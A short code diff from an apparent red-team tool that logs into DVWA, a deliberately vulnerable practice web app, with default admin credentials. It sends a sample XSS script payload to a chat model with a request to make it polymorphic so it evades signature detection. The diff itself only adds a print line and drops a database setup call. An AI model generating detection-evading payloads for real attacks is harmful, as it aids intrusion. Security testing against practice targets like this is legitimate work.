@@ -32,6 +32,7 @@ class PointlessAI_advanced_evasion_techniques(DVWA_Session, ChatGPT_Func, Genera
         guidance = f"Generate a polymorphic version of this JS code to evade signature detection. {self.no_markdown}"
         polymorphic_payload = self.red_team_query(payload, guidance)
         print(payload)
+        print("Polymorphic payload: \n")
         print(polymorphic_payload)
         return polymorphic_payload
 
@@ -56,8 +57,6 @@ class PointlessAI_advanced_evasion_techniques(DVWA_Session, ChatGPT_Func, Genera
         with requests.Session() as s:
             user_token, cookies = self.get_csrf_token_and_cookie(s, self.get_constants())
             _ = self.login_to_dvwa(s, self.get_constants(), "admin", "password", user_token)
-            user_token, cookies = self.get_csrf_token_and_cookie(s, self.base_url+"/setup.php")
-            _ = self.setup_database(s, self.base_url+"/setup.php", user_token, cookies)
             
             # Demonstrating polymorphic code generation and sandbox evasion
             original_payload = "<script>alert('Session ID is 123456')</script>"
